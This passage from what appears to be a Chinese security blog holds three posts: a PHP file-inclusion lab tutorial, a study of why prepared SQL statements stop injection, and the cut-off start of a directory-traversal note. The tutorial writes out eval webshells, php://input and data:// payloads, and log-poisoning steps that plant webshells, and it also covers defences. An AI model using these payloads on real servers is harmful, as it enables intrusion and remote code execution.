@eval($_POST[&#x27;pass&#x27;]);?&gt;&quot;)?&gt;这句话的意思就是当访问这个php代码后就会在当前目录生成一个shell.php文件，并且这个文件中含有一句话木马。\n\n通过查看服务器网站根目录，可以看到这里已经创建了一个名为shell.php的文件。那么我们通过这个文件使用蚁剑进行连接。\n\n通过上面的图片可以看到，我们已经成功连接了。这里需要注意的是，我们这个地址是知道的，若在实际环境中操作的时候可能需要注意查找路径。\n基于上面的文件包含的知识背景，我们可以有一个攻击的大概步骤：\n我们先从include函数入手，来看一下include函数有什么特殊的地方，为此我们编写一个小脚本来验证下。\n&lt;?phpshow_source(__FILE__);$file = $_GET[&#x27;file&#x27;];include $file;?&gt;\n​\t\t在验证文件包漏洞的时候我们通常使用/etc/passwd文件是否能够被成功读取，该文件是我们linux的用户组信息，且这个文件的权限所有用户都可读。且里面包含的信息是我们当前服务器的所有用户的信息，属于敏感信息。\n现在我们用这个小脚本验证一下是否能够成功的读取/etc/passwd文件。\n\n我们发现成功的读取了/etc/passwd下面的文件。下面我们换一下我们要读取的文件，换个不存在的文件试一试，看看有什么效果\n\n​\t\t我们可以看到我们的服务器报了个warning的错误,因为此文件不存在，这正好是include函数的特点，文件不在的时候会丢出warning的错误，然后还会接着运行下去。接下来我们将include函数切换到require函数，看看有什么区别。\n\n​\t\t我们可以看到，我们的include在找不到文件的情况下会丢出warning的错误，而我们的requore函数直接丢出failed错误，直接就停止运行了，这就是我们之前介绍我们include和require函数的区别的地方。\n​\t\t下面我们从session文件包含来进行getshell的演示，我们先从phpinfo的信息获取到我们session的存储位置（这个位置其实我们可以猜测到的，因为就那几个固定的存储位置，例如：/var/lib/php5/sessions、/var/lib/php7/sessions、/var/lib/php/sessions等）\nps: 接下来先跟着吧,我的环境是windows的…\n\n为了验证session文件包含漏洞我们编写了一个简单的脚本，如下所示：\n&lt;?phpshow_source(__FILE__);session_start();$_SESSION[&#x27;PHPSESSID&#x27;] = $_GET[&#x27;name&#x27;];include $_GET[&#x27;file&#x27;];\n​\t\t我们先打开浏览器访问此文件，然后我们在按F12键，查看我们的cookie，我们可以看到我们cookie中有个PHPSESSID的名称，其中它的值就是我们sessionid的值，也就是我们需要包含的文件。\n我们在通过这个脚本，向seesion写入恶意的数据\n\n​\t\t这个时候我们打开我们的服务器，进去我们存储session的目录,然后找到对应的session文件，我们可以看到我们的内容已经成功写入到我们的session里面了。\n\n然后我们访问我们session文件发现我们写入的脚本已经成功被执行了\n\n接下来我们继续验证日志文件包含，但是我们需要满足条件才能进行文件包含，因为我们在读取文件的时候我们需要权限才能读取，我们看一下我们原本服务器日志文件的权限(这里看别人的)\n\n可以看到我们可读权限仅适用于当前用户和用户组，其它用户并没有可读的权限。为了验证我们的实验，我们将其它用户设置成可读的权限。这样我们就可以读取我们的日志文件了。\n\n​\t\t现在我们就可以构造我们恶意的日志信息了，这里有一点需要注意下，我们在构造我们的日志信息的时候，不能直接在浏览器中构造（在url后面构造信息），因为如果直接在浏览器中构造，存储到日志信息的时候就会进行urlencode编码了，导致我们不能正常构造我们需要的日志信息，此时我们就需要BurpSuite工具了，通过抓包修改数据，这样存储的日志就不会进行urlencode编码了。\n这里用现成的图片, 我忘了截屏了\n\n可以看到已经写到了日志文件\n这里不知道为何包含不了\n\n1.6文件包含之伪协议利用\nfile://    #访问本地文件系统http://    #访问HTTPs网址ftp://     #访问ftp URLphp://     #访问输入输出流zlib://    #压缩流data://    #数据ssh2://    #security shell2expect://  #处理交互式的流glob://    #查找匹配的文件路径\nphp语言内置了很多封装协议，而这些协议则是我们处理文件包含漏洞经常用到的方法，最常见的协议有以下几种：\nphp://input\nphp://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替  $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。  enctype=“multipart/form-data” 的时候 php://input 是无效的。\n此协议需要allow_url_include为on，在之前也强调过了。Input伪协议可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，所以它才能执行我们构造的数据。\nphp://input主要是用来执行php代码的，不过php://input需要以POST提交，这里我们先在URL中添加php://input然后抓包把GET修改为POST(但如下两图可以看出似乎不必把get修改为post)，最后在数据包的最后输入想要执行的代码就可以实现代码执行。\n用法：#URL中:?page=php://input#请求数据中：&lt;?php system(whoami);?&gt;  #这里是通过php代码执行系统命令whoami;\n\n\n1、在文件包含页面，通过burpsuite抓包：\n2、用burpsuite抓包在url中输入php://input，在底部请求数据中可以写任意PHP代码：\n获得phpinfo信息：\n\n3、通过php代码执行系统命令：\n\n4、写入一句话木马文件：\n&lt;?php fputs(fopen(&#x27;test.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[test]);?&gt;&#x27;);?&gt;\n\n\n5、页面出现乱码解决：\n在setting设置中可以找到\n\nphp://filter\nphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file()和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\nphp://filter 可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启，读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了\n利用条件：\n\n只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求。\n\n用法：php://filter/read=convert.base64-encode/resource=要读取的文件\nURL：http://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=2.php解密：&lt;?php phpinfo();?&gt;\n\n我们来看下我们用filter伪协议读取的文件，因为我们使用了转换过滤器，导致输出的结果是base64编码的格式\nbase64解码得到flag\n当然里不单单只能读取当前目录下的文件，这里就演示一下另外一种读取方式，我将文件放在上一级目录中，通过php进行读取。\nURL：http://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=../2.php\n仔细看URL连接就能看出来，这里使用了之前提到的相对路径读取。\n\n其中filter伪协议内置了很多过滤器，有字符串过滤器，转换过滤器、压缩过滤器、加密过滤器等\n\n用法：\n?page=php://filter/read=convert.base64-encode/resource=file1.php\n1、调整DVWA的安全级别，并进入文件包含里面：\n2、使用php://协议进行文件包含file1.php，可以看到，已经返回了包含文件的base64加密源码：\n\n这个协议的含义为：通过php协议读取本地敏感文件的源代码，对读取的的文件进行base64加密，并返回加密后的文件内容。\n\n解密得到源码\n4、通过目录穿越的方法读取index.php文件：\n?page=php://filter/read=convert.base64-encode/resource=../../index.php\n一般我们是在已知网站结构路径的前提下，获取网站的源代码。\n\nfile://\nfile:// — 访问本地文件系统, file其实和绝对路径读取差不多。\nURL：http://192.168.10.150/1.php/?name=file://C:/Windows/win.ini\n靶场源码：\n&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ]; //定义一个变量，通过GET的请求方式接收我们包含的文件；// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; //如果通过get方式传递过来的参数字符串中，开头没有以file*开头的字符串，并且不能包含include.php文件；    //语法:fnmatch(pattern,string,flags)：    //pattern 必需。规定要检索的模式；    //string \t必需。规定要检查的字符串或文件。    echo &quot;ERROR: File not found!&quot;; 则输出文件未发现，并且退出    exit;&#125;?&gt; \n校验流程：通过GET的请求方式接收包含的文件--&gt;如果通过get方式传递过来的参数字符串中，开头没有以file*开头的字符串，并且不能包含include.php文件--&gt;则输出文件未发现，并且退出\n利用条件：\n\nfile:// 用于访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。\n\n用法：?page=file:///文件绝对路径\n1、调整DVWA的安全级别，并进入文件包含里面：\n2、使用本地文件包含，没有发现文件：\n注：通过上面源码我们发现，只要传入的参数的没有以file开头的字符，则输出文件未发现，并且退出。\n\n3、这里我们通过file:///协议进行绕过，发现可以访问host文件：\n我们包含：file:///C:\\Windows\\System32\\drivers\\etc\\hosts\n\nhttp: //\n其实http这里的利用方式，除了能够跳转，还能进行远程包含进行漏洞执行。\nURL：http://192.168.10.150/1.php/?name=http://www.baidu.com\n\ndata: //\n从php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行任意代码。\n这里需要注意若使用data的话需要allow_url_include 和allow_url_fopen为on。\n利用条件：\n\n和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同。\n  条件：allow_url_fopen参数与allow_url_include都需开启。\n\n#用法1：?page=data:text/plain,&lt;?php 执行内容 ?&gt;#用法2：?page=data:text/plain;base64,编码后的php代码\n1、使用用法1执行代码：\n执行内容：\n&lt;?php system(whoami);?&gt;\n\n2、使用用法2执行代码：\n执行内容：\n&lt;?php system(whoami);?&gt;\n注：经base64编码后的加号和等号要手动的url编码，以免浏览器识别不了。\n对执行内容进行base64加密：\n\n可以看到系统命令已经执行成功：\n\nftp://和ftps://\nftp:// – ftps:// — 访问 FTP(s) URLs\nzip://\n可以访问压缩包里的文件。当他与包含函数结合时，zip://流会被当做php文件执行。\n下面是针对某些封装协议的利用方式和特点\n\n利用条件：\n\nzip://可以访问压缩文件中的文件。\n  条件： 使用zip协议，需要将#编码为%23，所以需要PHP 的版本 &gt;=5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。\n\n用法：?page=zip://[压缩文件路径]#[压缩文件内的子文件名]\n1、将靶机网站主目录下的1.php，压缩成1.zip压缩包：\n内容：\n&lt;?php phpinfo();?&gt;\n\n\n2、通过zip://伪协议对它进行文件包含：\n\n注：要是把压缩包的后缀改为其他任意格式的文件也可以正常使用\ncompress.bzip2://\n用法：\n?file=compress.bzip2://D:/soft/phpStudy/www/file.bz2【or】?file=compress.bzip2://./file.bz2\ncompress.zlib://\n?file=compress.zlib://D:/soft/phpStudy/www/file.gz【or】?file=compress.zlib://./file.gz\nphar://\n利用条件：\n\n与zip://协议类似，但用法不同，zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开。\n\n用法：\n?page=phar://[压缩文件路径]/[压缩文件内的子文件名]\n使用phar://对1.zip文件进行文件包含：\n\n1.7文件包含日志读取\n日志会记录客户端请求及服务器响应的信息，访问http://www.xx.com/时，也会被记录在日志里，也可以插入到User-Agent，但是请求的信息有可能被url编码之后记录日志，这里可以通过burp来发送请求包来防止被编码，通过相对路径找到日志文件，利用包含漏洞执行。各类日志存在位置\n1.1 漏洞原理\n  当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。\n  Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。\n\n1.2 利用方法\n\n通过日志文件getshell：\n1.通过burpsuite发送的请求包产生日志数据；\n2.包含日志文件；\n3.写入一句话木马getshell\n\n1.3 Apache\napache存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。\n1）Windows系统：apache安装目录/logs/access.log或者error.log2）linux系统：/var/log/apache/access.log或者error.log/var/log/apache2/access.log或者error.log/etc/httpd/logs/access_log或者error.log\n实操：\n1. 日志文件路径：\nD:\\labwork\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs\n这里主要查看access.log这个日志，这个日志记录着服务器所有的访问记录，包括一些攻击流量：\n\n2. 没有access.log访问日志的原因：\n进入日志目录下，如果发现没有access.log这个访问日志，是因为apache配置文件没有打开这个配置选项，需要对相应的功能进行开启。\n3. 开启access.log访问日志功能：\n1、通过配置文件的开启access.log访问日志功能：\n\n2、搜索CustomLog &quot;logs/access.log&quot; common，将前面的##注释去掉，并保存文件，然后重启PHPstudy:\n\n\n3、查看访问日志文件，日志目录下已经出现这个文件，说明成功开启访问日志功能：\n4、访问几个网页，查看记录，对自己访问的页面有记录，说明access.log可以自动记录访问操作：\n实操过程：\n1、我们通过访问，让访问日志记录我们的phpinfo();代码，可以看出，访问日志已经成功记录了我们的访问历史：\n访问内容：\n&lt;?php phpinfo();?&gt;\n\n\n注：通过上图我们可以看出，日志已经成功记录我们的访问历史，但是是经过URL编码后的结果。如何让它记录我们原始完整的代码呢？一般URL编码是我们的浏览器进行完成的，它对我们访问的目录做了URL编码，然后发送到服务器，我们可以通过burpsuite，把经过浏览器URL编码后的数据进行修改。\n2、使用burpsuite修改编码后的数据：\n\n3、查看访问日志，可以看出，没有编码的phpinfo();代码已经成功记录：\n\n4、文件包含只要文件中有php代码，它就会把这个文件当做php脚本进行解析，这样我们可以包含这个日志文件，让目标服务器把日志文件解析为php脚本；可以看出，已经成功解析日志文件为php脚本：\n\n5、让访问日志文件记录下写入文件脚本代码：\n访问内容：\n&lt;?php $file=fopen(&#x27;test1.php&#x27;,&#x27;w&#x27;);fputs($file,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;);?&gt;\n\n\n6、对访问日志进行文件包含，并查看创建的一句话脚本，已经创建成功：\n\n这里不知为何老是被截断，说是有特殊字符或者长度过长，我不理解，就先学个思路吧\n下面是成功者的图片\n\n\n7、使用蚁剑连接webshell，成功获得靶机的webshell权限：\n\n1.4 Nginx\nnginx存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。\n1）Windows系统：nginx安装目录/logs/access.log或者error.log2）linux系统：/var/log/nginx/access.log或者error.log\n1.5 IIS\n1）iis6.0版本C:\\windows\\system32\\LogFiles2）iis7.5版本%SystemDrive%\\inetpub\\logs\\LogFiles\n1.6 包含Apache日志案例\nApache运行后一般默认会生成两个日志文件，access.log(访问日志)，error.log(错误日志)。\n下图就是被转码的，只需要手动修改一下重新发送即可。(这里的转码就不叙述了, 上述有: 1.5.6 远程文件读取)\nURL：http://192.168.10.150/&lt;?php @eval($_POST[123]);?&gt;\n通过对本地的日志文件进行包含读取，输入123=phpinfo();。\nURL:http://192.168.10.150/1.php/?name=../Apache/logs/error.logPOST: 123 = phpinfo();\n当然也可以使用蚁剑来进行连接。\nURL：http://192.168.10.150/1.php/?name=../Apache/logs/error.log连接密码：123\n\n1.8文件包含漏洞攻击防范\n​\t\t文件包含漏洞已经是Web安全史上经常用的攻击手段，且它的利用方式简单，造成的危害巨大，虽然我们现在已经有了很全面的防范对策，但是它的危害还是很大，上述实验我己经从多种角度解析了文件包含漏洞，也阐述了它可以做的事情已经造成的危害，下面我们开始着重介绍怎么对此漏洞进行防范和检测，避免造成不必要的损失。\n0x01检查服务器配置文件\n​\t\t在php中有个php.ini的配置文件，里面大概是对php语言所有功能配置文件集合，其中里面有两项是allow_url_fopen、allow_url_include两个选项，其中allow_url_fopen默认是开启的，allow_url_include默认是关闭的，如果我们开启这个配置文件，我们就可以使用伪协议读取我们的敏感信息和其它操作，虽然开启allow_url_fopen也可以读取我们的文件，但是我们可以通过过滤一些字符或者限制用户的输入从而达到攻击者不能读取我们信息的操作。\n0x02过滤特殊符号\n​\t\t在进行文件包含的时候我们可能经常会用到几个固定的字符，或者我们在用伪协议的时候我们也会使用特定的字符，例如：\\，//，input，output，filter等我们可以将这些铭感字符都给过滤掉。代码如下\n&lt;?phpshow_source(__FILE__);$file = $_GET[&#x27;file&#x27;];$file = str_replace( array( &quot;http://&quot;,&quot;file://&quot;), &quot;&quot;,$file);$file = str_replace( array(&quot;../&quot;, &quot;..\\&quot;&quot;), &quot;&quot;,$file);$file = str_replace( array(&quot;/&quot;, &quot;\\\\&quot;), &quot;&quot;,$file);include $file;?&gt;\n此时我们再用我们之前的攻击手法，发现已经读取不到文件了。\n\n因为str_repleace只会替换一次，可以有办法绕过的，所以这里我们还有正则匹配的方式，只要用户输入的字符串被我们正则匹配我们就会警告结束程序的运行。我们来看下我们的源码。\n&lt;?phpshow_source(__FILE__);$file = $_GET[&#x27;file&#x27;];if(preg_match(&quot;/..\\/|http|ftp|\\/|\\/\\//&quot;, $file))&#123;\techo &quot;不合法字符&quot;;&#125;else&#123;\tinclude $file;&#125;\n\n0x03指定包含的文件 （白名单）\n​\t\t我们在做网站开发的时候我们可能经常会使用我们文件包含的函数，但是我们呢包含的文件都是我们指定的文件，也就是我们知道我们需要包含什么文件。这样，我们在包含文件的时候就可以添加一条规则，让我们只能包含指定的文件，如果我们包含了非指定的文件，程序就会报错退出。下面来看下我们实现的方法。\n&lt;?phpshow_source(__FILE__);$file = $_GET[&#x27;file&#x27;];if($file != &quot;flag.php&quot;)&#123;\techo &quot;Error!&quot;;\tdie();&#125;\n0x04设置文件目录\n​\t\tphp的配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置文件目录的话，我们编写的脚本只会在该目录中搜索文件，这样我们就可以把我们需要包含的文件放到这个目录就可以了，从而也避免了敏感文件的泄露。\n\n漏洞修复首先是无解的WAF产品固定后缀：添加文件后缀到所包含的文件名。实战情况下不清楚所添加的后缀，未知将在造成更多的疑虑，但是可以测一测固定文件：似与C语言头文件，不进行所包含文件的修改，都定下来。对可变的所包含文件名进行检测！\n一般java的站点存在文件系列的洞比较多(除了文件包含)。\n","categories":["常见top漏洞"]},{"title":"预编译sql防御","url":"/2023/08/07/%E9%A2%84%E7%BC%96%E8%AF%91SQL%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5/","content":"前言\n为啥用 PreparedStatement 预编译的 SQL 就不会有被 SQL 注入的风险？\n第一时间我联想到的是八股文中关于 Mybatis 的脚本 $&#123;&#125; 和 #&#123;&#125; 的问题，不过再想想，为啥 $&#123;&#125; 会有 SQL 注入的风险，而 #&#123;&#125; 就没有？是因为到 PreparedStatement 做了什么处理吗？不知道。\n然后我又想了想，预编译到底是个什么概念？预编译或者不预编译的 SQL 对数据库来说有什么区别吗？PreparedStatement 又在这个过程中扮演了怎样的角色？不知道。\n好吧，我发现我确实对这个问题一无所知，看来需要亲自研究一下了。(这是真的)\n一、数据库预编译\n当我们说到关于持久层框架的功能，必然需要先想想这个功能的源头到底是不是直接通过数据库提供的。实际上和事务一样，SQL 预编译的功能也是需要数据库提供底层支持的。\n1、预编译SQL的用法\n以 MySQL 为例，在 MySQL 中，所谓预编译其实是指先提交带占位符的 SQL 模板，然后为其指定一个 key，MySQL 先将其编译好，然后用户再拿着 key 和占位符对应的参数让 MySQL 去执行，用法有点像 python 中的 format 函数。\n一个标准的预编译 SQL 的用法如下：\nprepare prepare_query from &#x27;select * from s_user where username = ?&#x27; # 提交带有占位符的参数化 SQL，也可以理解为 SQL 模板set @name = &#x27;%王五&#x27;; # 指定一个参数execute prepare_query using @name; # 指定参数化 SQL 的 key 和参数，让 MySQL 自己去拼接执行\n先通过 prepare 设置一个 SQL 模板，然后通过 execute 提交参数，MySQL 会自行根据参数替换占位符，到最后执行的 SQL 就是：\nselect * from s_user where username = &#x27;%王五&#x27;\n2、预编译的原理\n这里有个有意思问题，按网上的说法，prepare 执行的时候实际上 SQL 已经编译完了，所以可以防止注入，因为后续不管塞什么参数都不可能在调整语法树了，换个角度想，这是不是说明，如果我们一开始就让 prepare 执行的 SQL 模板的关键字变成占位符，是不是应该在这个时候就编译不通过？\n比如，可以把查询的表名改成占位符：\nprepare prepare_query from &#x27;select * from ? where username = ?&#x27;# &gt; 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to # use near &#x27;? where username = ?&#x27; at line 1\n实际上也确实不行，因为编译时必须确定主表，因此在 from 后面加占位符会导致预编译不通过。\n那么只在查询字段里面套一个嵌套查询呢？\nprepare prepare_query from &#x27;select ? from s_user&#x27;;SET @c = &#x27;(select * from s_user) as q&#x27;;EXECUTE prepare_query using @c;# 查询结果# (select * from s_user) as q# (select * from s_user) as q# (select * from s_user) as q# ......\n查询成功了，不过得到的结果的固定的 (select * from s_user) 这个字符串，我们检查一下 MySQL 的执行日志，看看最终执行的 SQL 变成什么样了：\nPrepare\tselect ? from s_userQuery\tSET @c = &#x27;(select * from s_user) as q&#x27;Query\tEXECUTE prepare_query using @cExecute\tselect &#x27;(select * from s_user) as q&#x27; from s_user # 最终执行的SQL\n显然，(select * from s_user) 参数本身被直接转义为了一串普通的字符串，我们试图“注入”的 SQL 片段完全不会生效。\n换而言之，对于预编译 SQL 来说，我们作为模板的参数化 SQL 已经完成的编译过程，这段 SQL 包含几条有效语句？查哪张表？查哪些字段？作为条件的字段有哪些？…这些在 prepare 语句执行完后都是固定的，此后我们再通过 execute 语句塞进去的任何参数，都会进行转义，不会再作为 SQL 的一部分。这就是为什么说预编译 SQL 可以防止注入的原因。\n二、JDBC的预编译\n现在我们知道了预编译在数据库中是个怎样的功能，那么 JDBC 又是如何把这个功能提供给开发者使用的呢？\n1、PreparedStatement\n从最开始学 JDBC 时，我们就知道通过 JDBC 连接数据库一般是这样写的：\nClass.forName(JDBC_DRIVER); // 加载驱动Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD); // 获取连接PreparedStatement preparedStatement = connection.prepareStatement(sql); // 获取sqlStatementpreparedStatement.setString(1, foo); // 设置参数ResultSet resultSet = preparedStatement.executeQuery(); // 执行SQL\n这里有一个关键角色 PreparedStatement，相比起它的父接口 Statement，它最大的变化是多了各种格式为 setXXX 的、用于设置与占位符对应的参数的方法，显然它正对应着上文我们提到的预编译 SQL。\n2、虚假的“预编译”\n不过事情显然没有这么简单，我们依然以 MySQL 为例，默认情况下 MySQL 驱动包提供的 PreparedStatement 实现类 ClientPreparedStatement 也能起到防止 SQL 注入的功能，但是方式跟我们想的不太一样。\n假设现有如下代码，我们尝试模拟进行一次 SQL 注入：\nString sql = &quot;select * from s_user where username = ?&quot;;PreparedStatement preparedStatement = connection.prepareStatement(sql);preparedStatement.setString(1, &quot;王五&#x27; union select * from s_user&quot;);ResultSet resultSet = preparedStatement.executeQuery();\n运行上述代码并正常的请求数据库，然后我们去数据库执行日志中查看对应的执行的 SQL 如下，会发现只有这么一行：\nQuery select * from s_user where username = &#x27;王五&#x27;&#x27; union select * from s_user&#x27;\n显然跟我们上文说到的先 prepare 再 execute 流程不同，带有占位符的原始 SQL 模板并没有在日志中出现，但是代码中的 王五' 确实也被转义为了 '王五''。\n数据库到底收到了哪些数据？\n那么数据库到底拿到的就是这条 SQL，还是原始的 SQL 模板 + 参数呢？\n为了了解这一点，我们打断点跟踪 ClientPreparedStatement.executeQuery 方法，一路找到它组装请求数据库的参数的那一行代码：\nMessage sendPacket = ((PreparedQuery&lt;?&gt;) this.query).fillSendPacket();\n最后我们会进入 AbstractPreparedQuery.fillSendPacket 这个方法，这里主要干的事是把我们带占位符的原始 SQL 模板和参数合并为最终要执行的 SQL ，并封装到 NativePacketPayload 对象，用于在后续发起 TCP 请求时把 SQL 参数转为二进制数据包。\n为了验证这一点，我们先拿到 sendPacket 对象，再获取里面的字节数组，最后转为字符串：\n\n可以看到内容就是已经格式化完的 SQL：\nselect * from s_user where username = &#x27;王五&#x27;&#x27; union select * from s_user&#x27;\n现在答案就很明显了，转义在 preparedStatement.setString 方法调用的时候完成，而 PreparedStatement 在发起请求前就把转义后的参数和 SQL 模板进行了格式化，最后发送到 MySQL 的时候就是一条普通的 SQL。\n鉴于此，我们可以说 MySQL 提供的 PreparedStatement 在默认情况下是假的“预编译”，它只不过在设置参数的时候帮我们对参数做了一下转义，但是最后发送到数据库的依然是普通的 SQL，而不是按预编译 SQL 的方式去执行。\n3、真正的预编译\n好吧，那既然 MySQL 提供了这个预编译的功能，那通过 JDBC 肯定也还是有办法用上真正的预编译功能的，实际上要做到这点也很简单，就是直接在驱动的 url 上配上 useServerPrepStmts=true ，这样就会真正的启用 MySQL 的预编译功能。\n依然以上文的代码为例：\nString sql = &quot;select * from s_user where username = ?&quot;;PreparedStatement preparedStatement = connection.prepareStatement(sql);preparedStatement.setString(1, &quot;王五&#x27; union select * from s_user&quot;);ResultSet resultSet = preparedStatement.executeQuery();\n设置了 useServerPrepStmts=true 后再执行代码，去数据库查看执行日志有：\nExecute select * from s_user where username = &#x27;王五\\&#x27; union select * from s_user&#x27;Prepare select * from s_user where username = ?\n此时 MySQL 的预编译功能就真正的生效了。\n我们回到 ClientPreparedStatement.executeQuery 创建 sendPacket 地方看，此时通过 ((PreparedQuery&lt;?&gt;) this.query).fillSendPacket(); 拿到的 Message 对象是 null，然后进一步追踪到最后向 MySQL 发送请求的地方 NativeSession.execSQL：\npublic &lt;T extends Resultset&gt; T execSQL(Query callingQuery, String query, int maxRows, NativePacketPayload packet, boolean streamResults,                                       ProtocolEntityFactory&lt;T, NativePacketPayload&gt; resultSetFactory, ColumnDefinition cachedMetadata, boolean isBatch) &#123;    // ... ...    try &#123;        // 如果 sendPacket 为 null，则调用 sendQueryString 方法，把原始 sql 和参数序列化为二进制数据包        return packet == null            ? ((NativeProtocol) this.protocol).sendQueryString(callingQuery, query, this.characterEncoding.getValue(), maxRows, streamResults, cachedMetadata, resultSetFactory)            // 否则调用 sendQueryPacket 方法，直接发送数据包            : ((NativeProtocol) this.protocol).sendQueryPacket(callingQuery, packet, maxRows, streamResults, cachedMetadata, resultSetFactory);    &#125;    // ... ...&#125;\n更具体的实现就不看了，基本都是关于序列化请求参数的逻辑。\n三、Myabtis占位符与预编译\n至此问题真相大白了，不过还是顺带扯一下八股文常提到的 Mybatis 占位符 #&#123;&#125; 与 $&#123;&#125; 是如何影响 SQL 注入问题的。\n当然，看完上面的内容其实就已经很好猜到原因了：\n\n#&#123;&#125; 对应的内容会作为 SQL 参数的一部分通过 PreparedStatement.setXXX 装入请求；\n$&#123;&#125; 对应的内容会直接作为 SQL 模板的一部分，而不会视为独立的请求参数；\n\n在 Mybatis 中，用于解析占位符的类为 GenericTokenParser ，根据它我们很容易在源码中找到占位符的处理方法，从而验证我们的猜想：\n其中，#&#123;&#125; 占位符在 SqlSourceBuilder.ParameterMappingTokenHandler.handleToken 方法中处理：\npublic String handleToken(String content) &#123;    parameterMappings.add(buildParameterMapping(content));    return &quot;?&quot;;&#125;\n可见 #&#123;&#125; 占位符会被解析为 ? 占位符，而对于的数据会被添加到 parameterMappings 用于后续塞到 PreparedStatement。\n而 $&#123;&#125; 占位符在 PropertyParser.VariableTokenHandler.handleToken 方法中被处理：\npublic String handleToken(String content) &#123;    if (variables != null) &#123;        String key = content;        if (enableDefaultValue) &#123;            final int separatorIndex = content.indexOf(defaultValueSeparator);            String defaultValue = null;            if (separatorIndex &gt;= 0) &#123;                key = content.substring(0, separatorIndex);                defaultValue = content.substring(separatorIndex + defaultValueSeparator.length());            &#125;            if (defaultValue != null) &#123;                return variables.getProperty(key, defaultValue);            &#125;        &#125;        if (variables.containsKey(key)) &#123;            return variables.getProperty(key);        &#125;    &#125;    return &quot;$&#123;&quot; + content + &quot;&#125;&quot;;&#125;\n若占位符符合规范，则占会根据占位符中的内容去用户给定的参数中取值，并且让值直接替换掉原本 SQL 脚本中的 $&#123;&#125; 占位符。\n这就是“ Mybatis 用 #&#123;&#125; 而不是 $&#123;&#125; 可以防止 SQL 注入的真相。\n总结\n回顾一下全文，当我们说“预编译”的时候，其实这个功能来自于数据库的支持，它的原理是先编译带有占位符的 SQL 模板，然后在传入参数让数据库自动替换 SQL 中占位符并执行，在这个过程中，由于预编译好的 SQL 模板本身语法已经定死，因此后续所有参数都会被视为不可执行的非 SQL 片段被转义，因此能够防止 SQL 注入。\n当我们通过 JDBC 使用 PreparedStatement 执行预编译 SQL 的时候，此处的预编译实际上是假的预编译（至少 MySQL 是如此，不过其他数据库仍待确认），PreparedStatement 只是在设置参数的时候自动做了一层转义，最终提交给数据库执行的 SQL 仍然是单条的非预编译 SQL。\n而当我们通过在驱动 url 上开启 useServerPrepStmts 配置后，预编译就会真正的生效，驱动包发往数据库的请求就会分成带占位符的 SQL 模板和参数，到了数据库再由数据库完成格式化并执行。\n此外，八股文常提到的“Mybatis 的 #&#123;&#125; 相比 $&#123;&#125; 可以防止 SQL 注入”这一点，本质上是因为 #&#123;&#125; 占位符会被解析为 SQL 模板中的 ? 占位符，而 $&#123;&#125; 占位符会被直接解析为 SQL 模板的一部分导致的。\n最后脑补一下，由于 useServerPrepStmts 不开启时 PreparedStatement 的预编译实际上是假的预编译，所以理论上使用 #&#123;&#125; 也并非绝对安全，如果有办法绕过 PreparedStatement 的检查，那么数据库拿到被注入过的 SQL 直接执行，依然有暴毙的风险。\n","categories":["常见top漏洞"]},{"title":"浅析目录穿越","url":"/2023/08/07/%E6%B5%85%E6%9E%90%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/","content":"0x01 简介\n目录穿越（也被称为目录遍历）是通过使用../等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。\n路径穿越是网站被恶意人员利用，来得到其无权限访问的内容。\n通常是由于代码没有判断拼接路径的真实路径是否合法，最终导致文件读取。\n一般来讲用户在网站进行浏览，所能见到的网页都是位于网站根目录下的文件，根目录以外的文件是不允许被未授权访问的。但是安全方面做得不严谨的web程序可能会出现目录穿越漏洞，恶意人员可以利用这个漏洞来读取根目录以外的文件夹。一旦成功，本不应该暴露的敏感信息就可能被泄漏给恶意人员。\n0x02 攻击payload\n1.URL参数\n\n··/\n..\\\n..;/\n\n2.Nginx off by slash\n\nhttps://vuln.site.com/files../\n\n3. UNC 